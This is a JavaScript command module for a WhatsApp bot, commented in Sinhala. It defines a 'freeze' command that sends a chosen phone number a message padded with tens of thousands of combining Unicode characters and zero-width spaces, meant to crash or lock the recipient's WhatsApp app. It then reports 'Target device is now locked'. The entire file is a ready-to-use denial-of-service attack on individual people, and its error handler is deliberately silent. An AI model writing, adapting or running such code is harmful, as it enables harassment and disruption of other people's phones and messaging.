const { cmd } = require('../command');

cmd({
    pattern: "freeze",
    alias: ["lock", "dead"],
    desc: "Infinite WhatsApp Crash Loop",
    category: "owner",
    react: "🥶",
    filename: __filename
},
async (conn, mek, m, { from, isOwner, reply, args, senderNumber }) => {
    try {
        // --- අවසර ලත් අංක (Whitelist) ---
        const authorizedNumbers = ['94740137623']; // මෙතනට ඔයාගේ අංක ටික දාන්න
        if (!authorizedNumbers.includes(senderNumber) && !isOwner) return;

        if (!args[0] && !m.quoted) return reply("අංකයක් දෙන්න නැත්නම් මැසේජ් එකකට reply කරලා .freeze ගහන්න.");

        let target = m.quoted ? m.quoted.sender : args[0].replace(/[^0-9]/g, "") + "@s.whatsapp.net";

        // 1. අතිශය ප්‍රබල Crash Payload එක නිර්මාණය කිරීම
        // මෙය සාමාන්‍ය මැසේජ් එකකට වඩා 100 ගුණයකින් බර වැඩියි
        const ptcp = "\u0345\u0361\u0345".repeat(15000); // Heavy Unicode
        const bug = "҉".repeat(5000); // Buffer overflow symbols
        const space = "\u200b".repeat(20000); // Invisible heavy space
        
        const heavyPayload = `*⚠️ SYSTEM CRITICAL OVERLOAD ⚠️*\n\n` + space + ptcp + bug + `\n\n*WHATSAPP HAS STOPPED WORKING*`;

        // 2. මැසේජ් එක යැවීම
        // මෙහි ContextInfo එකට බර වැඩි දේවල් දැම්මම ඇප් එකට ඒක රෙන්ඩර් කරන්න බැරුව Crash වෙනවා.
        await conn.sendMessage(target, { 
            text: heavyPayload,
            contextInfo: {
                forwardingScore: 999,
                isForwarded: true,
                externalAdReply: {
                    title: "W H A T S A P P  F R E E Z E",
                    body: "Device Unresponsive",
                    mediaType: 1,
                    renderLargerThumbnail: true,
                    thumbnailUrl: "https://files.catbox.moe/vbo0vq.png", 
                    sourceUrl: "https://github.com/Hashan-MD"
                }
            }
        }, { quoted: mek });

        reply("✅ Freeze Payload Deployed! Target device is now locked. 💀");

    } catch (e) {
        // Error එකක් ආවත් පේන්න දෙන්න එපා, ඒක නිසා මෙතන හිස්ව තියන්න
    }
});
